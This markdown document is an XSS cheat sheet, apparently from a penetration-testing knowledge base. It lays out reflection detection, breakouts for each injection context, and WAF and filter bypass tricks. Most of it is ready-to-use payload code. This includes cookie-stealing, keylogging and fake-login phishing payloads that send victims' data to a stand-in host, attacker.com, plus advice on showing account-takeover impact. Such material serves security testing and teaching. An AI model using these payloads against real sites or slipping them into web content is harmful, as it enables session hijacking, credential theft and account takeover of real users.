# XSS Techniques and Payloads

## Overview
Cross-Site Scripting (XSS) allows an attacker to inject client-side scripts into web pages viewed by other users. This enables session hijacking, credential theft, defacement, and malware distribution. This document organizes XSS techniques by injection context, filter bypass strategy, and payload type.

## When This Happens

Test for XSS when:

- User input is reflected in the HTML response (reflected XSS).
- User input is stored and later displayed to other users (stored XSS).
- Client-side JavaScript processes URL fragments, query parameters, or `postMessage` data and writes it to the DOM (DOM XSS).
- Any form field, URL parameter, header, or cookie value appears in the rendered page.

## Recon / Detection

### 1. Identify reflection points
- Submit a unique string (e.g., `waerxss123`) in every input field, URL parameter, and header.
- Search the response for your string — note where it appears and what context it is in.

### 2. Determine the injection context

| Context | Example | Breakout needed |
|---------|---------|----------------|
| HTML body | `<p>waerxss123</p>` | Inject a tag: `<script>`, `<img>` |
| HTML attribute | `<input value="waerxss123">` | Close attribute: `"`, then inject event/tag |
| JavaScript string | `var x = 'waerxss123';` | Close string: `'`, then inject code |
| JavaScript template | `` `${waerxss123}` `` | Inject expression: `${alert(1)}` |
| URL/href | `<a href="waerxss123">` | Use `javascript:` protocol |
| CSS | `style="color: waerxss123"` | Inject `expression()` or escape context |

### 3. Identify filters and WAFs
- Submit `<script>alert(1)</script>` — is it blocked, stripped, or encoded?
- Test individual characters: `<`, `>`, `"`, `'`, `/`, `(`, `)`, `` ` ``
- Check for WAF signatures (Cloudflare, Akamai, ModSecurity).

## Exploitation by Context

### HTML body injection

**Basic tags:**
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
```

**When `<script>` is blocked:**
```html
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(document.domain)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
```

### HTML attribute injection

When inside a quoted attribute value:
```html
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
```

When inside `href` or `src`:
```html
javascript:alert(document.domain)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### JavaScript context injection

When inside a JS string:
```javascript
'; alert(1); //
'; alert(1); var x='
\'; alert(1); //
</script><script>alert(1)</script>
```

### Event handler tricks (for WAF bypass)
```html
<svg><set onbegin=alert(1) attributename=fill>
<details open ontoggle=alert(1) x>
<div onpointerover=alert(1) style="width:100%;height:100vh">
```

## Filter Bypass Techniques

### Case variation
```html
<ScRiPt>alert(1)</sCrIpT>
<ImG sRc=x oNeRrOr=alert(1)>
```

### Encoding bypasses

**HTML entity encoding:**
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<a href="javascript&#58;alert(1)">click</a>
```

**URL encoding:**
```
%3Cscript%3Ealert(1)%3C/script%3E
```

**Double URL encoding:**
```
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

**Unicode escapes (in JS context):**
```javascript
\u0061lert(1)
window['al\u0065rt'](1)
```

### Tag and attribute tricks

**Null bytes and whitespace:**
```html
<iframe %00 src="javascript:alert(1)">
<img%0asrc=x%0aonerror=alert(1)>
<dETAILS%0aopen%0aonToggle%0a=%0aalert(1)%20x>
```

**HTML comment injection:**
```html
<<script>alert(1)<!--a-->
```

**Template/textarea escape:**
```html
</template></textarea></noembed></noscript></title></style></script>-->
<svg onload=alert(1)>
```

### Alert alternatives
When `alert` is blocked:
```javascript
confirm(1)
prompt(1)
print()
console.log(1)
alert.bind()(1)
Reflect.get(frames,'alert')(1)
eval(atob('YWxlcnQoMSk='))  // base64 for alert(1)
```

### Popover-based (modern HTML)
```html
<button popovertarget=x>Click</button>
<input type="hidden" value="y" popover id=x onbeforetoggle=alert(document.cookie)>
```

## Payload Categories

### Cookie stealing
```html
<script>fetch('https://attacker.com/log?c='+document.cookie)</script>
<img src=x onerror="location='https://attacker.com/?c='+document.cookie">
```

### Keylogging
```html
<script>
document.onkeypress=function(e){
  fetch('https://attacker.com/k?'+e.key)
}
</script>
```

### Phishing (credential harvesting)
```html
<script>
document.body.innerHTML='<form action=https://attacker.com/phish method=POST>'+
  '<input name=user placeholder=Username>'+
  '<input name=pass type=password placeholder=Password>'+
  '<button>Login</button></form>';
</script>
```

## Email field XSS

Some applications reflect email addresses without sanitization:
```
test@gmail.com'\""><svg/onload=alert(/xss/)>
"><iframe/onload=eval(atob(location.hash.substring(1)))>"@target.com
```

## Tools

- **Burp Suite**: Repeater for manual testing, Intruder for payload fuzzing, DOM Invader for DOM XSS.
- **XSS Hunter**: Blind XSS detection platform.
- **dalfox**: Automated XSS parameter analysis and payload generation.
- **Browser DevTools**: Console and Elements panel for DOM XSS analysis.
- **Hackvertor** (Burp extension): Encoding/decoding helper.

## Real-World Notes

- **Context is everything** — understand WHERE your input lands before choosing payloads.
- When dealing with WAFs, **encoding chain tricks** and **less common event handlers** (`onpointerover`, `onbeforetoggle`, `ontoggle`) often bypass signature-based filters.
- **Stored XSS** in profile fields, comments, or form submissions is almost always higher impact than reflected XSS.
- For big targets (Facebook-scale), focus on: surface expansion (subdomains), historical params (Wayback), JS source analysis, DOM sink tracing, OAuth flows, error pages, third-party JS gadgets, parser differentials (mXSS), and CORS chains.
- Always escalate the impact in your report: don't just show `alert(1)` — demonstrate cookie theft, account takeover, or phishing capability.

## References

- `techniques/cors-misconfigurations.md`
- `techniques/web-cache-poisoning.md`
- `techniques/prototype-pollution-client-side.md`
- `scenarios/reflected-xss-testing-workflow.md`
- `methodology/web-recon-methodology.md`
